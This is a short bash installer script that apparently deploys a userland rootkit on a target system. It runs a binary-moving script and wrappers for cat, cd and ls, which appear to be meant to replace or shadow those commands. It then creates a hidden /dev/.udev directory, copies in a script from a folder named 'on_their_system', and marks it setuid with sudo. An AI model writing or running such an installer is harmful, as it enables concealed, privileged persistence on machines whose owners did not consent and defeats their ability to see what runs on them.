#!/bin/bash

# Run the binary backup script
bash move_binaries.sh

sleep 0.5

# Run each wrapper
bash wrapper/wrap_cat.sh
bash wrapper/wrap_cd.sh
bash wrapper/wrap_ls.sh

sudo mkdir -p /dev/.udev && sudo cp on_their_system/jvage.sh /dev/.udev/jvage.sh && sudo chmod u+s /dev/.udev/jvage.sh && sudo chmod 755 /dev/.udev/jvage.sh

